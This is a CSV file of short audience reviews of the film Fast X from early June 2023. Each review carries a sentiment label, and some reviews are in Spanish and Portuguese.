Date,Score,Reviews
"Jun 3, 2023",POSITIVE,Out of all the Furious movies I think this one is the best. It kept me on the end of my seat during the entire movie. But that ending though wasn't ready. Normally you get some closer at the end of the movie but not this time. Everything is left up in the air that you have to wait for the next movie in order for all your questions to be answered.  But one thing I loved was Jason Moana...he played his part to a T! Can't wait for the next installment
"Jun 3, 2023",POSITIVE,"nonstop action & the villain was perfect, but could've used a different actor cause Jason Momoa over acted the hell out of that movie."
"Jun 3, 2023",POSITIVE,"Money well spent.   To all the nerdy haters.   No, its not entirely realistic.   But sometimes you need that.  It's an escape.   The cast, explosions, fight scenes, etc are fun and entertaining.   If it's not your cup of tea.   Maybe you should go watch the cartoon spider verse or Little Mermaid.  Id watch it again.."
"Jun 3, 2023",POSITIVE,Good action...some heart wrenching moments.
"Jun 3, 2023",NEGATIVE,I left because the alarm went off in I didn’t watch the movie I got scared
"Jun 3, 2023",POSITIVE,Great movie. Didn’t feel like 2 1/2 hours.  The ending!!!!  OMG!!!!
"Jun 3, 2023",NEGATIVE,I didnt get to watch the movie because I brought tickets to the wrong theater in different city and I couldnt get an exchange or refund to the correct city and theater.
"Jun 3, 2023",POSITIVE,Everything !! its a great movie
"Jun 3, 2023",POSITIVE,Review:  https://wp.me/p65txm-dSz
"Jun 3, 2023",POSITIVE,I absolutely loved all the characters that were mentioned! The story line was exciting and I am waiting for the next movie!
"Jun 2, 2023",POSITIVE,I loved it! I felt it was as satisfying as the others! So glad I went to see it. Loved it!
"Jun 2, 2023",POSITIVE,"It was really action packed, and it kept my attention throughout."
"Jun 2, 2023",POSITIVE,Kept us on the edge of our seats in suspension!!!! Can't wait for the sequel!!!!!!
"Jun 2, 2023",NEUTRAL,"lots of action, would like it to go back to being about cars and racing."
"Jun 2, 2023",POSITIVE,SO GOOD!!!!! Can't wait for the next one👍💕
"Jun 2, 2023",POSITIVE,Action packed! Excellent movie..
"Jun 2, 2023",NEGATIVE,"This one was the worst. This Franchise so desperately needs a mercy-kill. The Fast franchise we all knew and loved no longer bares a soul and what we get now is a money grabbing machine. The second-hand embarrassment is palpable scene after scene. Littered with terrible one liners that make cheesy 80s movies look Oscar worthy, the best only relief you get are thanks to Jason Momoa and nothing else."
"Jun 2, 2023",POSITIVE,Captivating and hilarious. It has everything that made you first love the franchise and more. Someone has been paid a lot of money to bad mouth this movie. Dominic Toretto does not have superpowers. He simply has a moment where out of adrenaline he lifts a car that lives itself as soon as it is rocked forward a little bit. Would see you again and again and again.
"Jun 2, 2023",NEGATIVE,"didn't like how the movie end, and the role Jason played"
"Jun 2, 2023",POSITIVE,"Aside from the abrupt ending, and Jakob dying, which Is weird a bit, This was a very fun movie. And the Rock's return is huge too. Hopefully he and Cena get screen time together in the next one, because this saga is not over."
"Jun 2, 2023",POSITIVE,Amazing as always! & I CAN'T WAIT FOR THE NEXT ONE!
"Jun 2, 2023",POSITIVE,Loved it! The movie was action packed from beginning to end. The cameos were awesome. Just wish they didn't leave us hanging at the end
"Jun 2, 2023",POSITIVE,It's a  got to watch just to see who comes back
"Jun 2, 2023",POSITIVE,Loved the continuous action and twists and turns in the story!
"Jun 2, 2023",NEGATIVE,"Predeciblemente fast X es una entrega llena de acción ridícula ,con tramas secundarias tan simples que no sorprenden ,desde algún punto esta saga solo se  volvió una monótona historia que solo puede entregar acción y explosión ,lo mas destacable tal vez sea el villano que con una vibra de maniática logra mantener el filme en un punto aceptable por lo menos fast X mejoro con respecto a su nefasta antecesora."
"Jun 2, 2023",NEGATIVE,Who tf keeps watching these movies
"Jun 2, 2023",POSITIVE,Great action scenes and funny new villain. That’s about it. Same old same old
"Jun 2, 2023",NEGATIVE,"Oh lord , my main question is why ?"
"Jun 2, 2023",POSITIVE,"Fast X is a high-octane, globe-trotting spectacle filled with thrilling action sequences. Director Louis Leterrier maximizes the film's budget, delivering jaw-dropping moments like a bomb bouncing through the streets of Rome and a gigantic vault being dragged through Rio. While not as outlandish as Fast 9, the film's intense plot reunites Dominic Toretto with an unhinged antagonist, played energetically by Jason Momoa. Despite the recurring cast showing signs of fatigue, Momoa injects the sequel with a refreshing burst of energy."
"Jun 2, 2023",POSITIVE,Fabulous.  have gone to see it 3 times!!
"Jun 2, 2023",POSITIVE,I love this movie but hate how it ended. Fast 7 will always be my favorite.
"Jun 2, 2023",NEUTRAL,Some guy snuck in and kept watching us
"Jun 2, 2023",NEGATIVE,This movie franchise is now for milking in at this point. Let’s just stop going to see these movies so they’ll stop.
"Jun 2, 2023",NEGATIVE,"Went pretty much knowing what to expect. Even with that being true, I left after 1/2 an hour. But ok for those that like constant car chases, bad guys killing each other ( they all seemed like bad guys to me), etc etc"
"Jun 2, 2023",NEUTRAL,"Too many unbelievable action scenes and the new ""bad guy"" was too creepy and flamboyant for me. I also didn't care for the choice of who lives and who dies at the end. I am a big fan of the Fast series, especially with Paul Walker, but this final episode left me disappointed."
"Jun 2, 2023",NEUTRAL,"You can't expect a super excellent script out of a f&f saga but, what Jason momia does to his character it's just amazing, it's kinda controversial say that this movie it's bad and then say that the villain is amazing. Because all the story it's around him. So yea, all that thing about family and faith bla bla bla, but just put that on side and enjoy the movie 😮‍💨"
"Jun 2, 2023",POSITIVE,"We're close to the end, but it can't end without having us on the edge of our seats like the other The Fast And The Furious films have done. This one is different compared to the Fast 9. Brings a whole new story that makes a bad guy like Dante the psychotic winner. I can't wait til Fast 11. This is it. Fast X is another big one with full speed ahead on display."
"Jun 2, 2023",NEGATIVE,"Unironically silly and cartoonish, cheesy dialogues and yet the worst scene was being able to reverse the anesthesia gas back into the vents to make them baddies pass out. Why did such a bypass exist? Why am I watching this?"
"Jun 2, 2023",NEGATIVE,"It's not good. Too frequently it tries to be serious making it unfun. 

When Vin Diesel is on screen its a bad time, but the supporting cast (especially Cena and Mamoa) make it worth a shot for those familiar with the franchise."
"Jun 2, 2023",NEGATIVE,I can say it was better than fast 9 but not by much. At least they didn't go to space this time.
"Jun 2, 2023",NEGATIVE,"Le pongo 2 estrellas porque tiene muy buenas efectos pero cero historia , hay partes muy exageradas surrealistas (flasheras)"
"Jun 2, 2023",NEUTRAL,"Fun movie, the ending was disappointing but I will continue to see the series."
"Jun 2, 2023",NEUTRAL,"Well….  It was better than F9 !  Iv always been a defender of this crazy series. But F9 didn't just jump The MEG. It jumped the planet !  So going into this one I had no expectations. , Just grabbed my snacks and treat it like it is .. a popcorn movie. Check your brain at the door and have fun with it , kind of like Sharknado with cars .  Jason Momoa was a crazy joker-esk blast , He completely made the movie.  So go in sit back and watch the tornado hit the trailer park."
"Jun 2, 2023",NEUTRAL,"The family dynamic is what I like most. Of course the action is exciting. Its pretty far fetched, more so than other Furious movies."
"Jun 2, 2023",POSITIVE,This would be a movie that is just dumb fun. You can easily sit back and enjoy the action.
"Jun 2, 2023",NEUTRAL,"Unrealistic stunts defying the laws of physics, corny comedic segments and Vin Diesel says ‘family' more times than I've had hot dinners but this is what Fast & Furious has evolved into, and I love it."
"Jun 2, 2023",POSITIVE,Amazing action throughout the movie ! I was hooked for the whole duration of the movie ! Definitely want to watch it again !!
"Jun 2, 2023",NEUTRAL,Movie had a lot of different locations in the movie.  A little hard to follow.
"Jun 2, 2023",NEGATIVE,"I read Vin Diesel blames Jason Mamoa's over acting for negative reviews, Mamoa is what got me to the cinema to watch it in the first place and found his performance the best part of the film, the rest of the cast were mainly boring, except maybe Cena, Diesel was the worst."
"Jun 2, 2023",POSITIVE,DID NOT SEE THAT COMING! Absolutely hilarious and catch worthy! Can’t wait for the next one!
"Jun 2, 2023",NEGATIVE,"For a large budget movie cgi was terrible, it was supposed to end with 10 movies because that’s what was promised with Paul Walker, making this a trilogy is just milking it at this point"
"Jun 2, 2023",POSITIVE,It was an awesome movie!! Lots of unexpected but that is what makes the movie!!! Loved it!!!
"Jun 2, 2023",POSITIVE,"This is one of the better movies in the Fast and Furious franchise. The movie looks like money too! The locations, the cars- oh and the overall style! The stylist for the actors need an Oscar nod. The storyline is perfectly set up too. Definitely a must see!"
"Jun 2, 2023",NEGATIVE,"Muy mala no tena ni pies ni cabeza, se les acabaron las ideas"
"Jun 2, 2023",NEUTRAL,"Fun, entertaining, action packed, doesnt take itself too seriously."
"Jun 2, 2023",POSITIVE,WHAT A FANTASTIC ACTION PACKED MOVIE FROM START TOO FINISH CANNOT WAIT FOR THE SEQUEL TOO COME OUT IN 2025
"Jun 2, 2023",NEUTRAL,"Décimo filme da série apresenta o tema famíia, O vilão bem excêntrico e um roteiro pouco criativo, exceto pelas cenas para lá de impossíveis. Cansa e o final não finaliza, mas vale a pena para os fãs como mas alguns confusã tem"
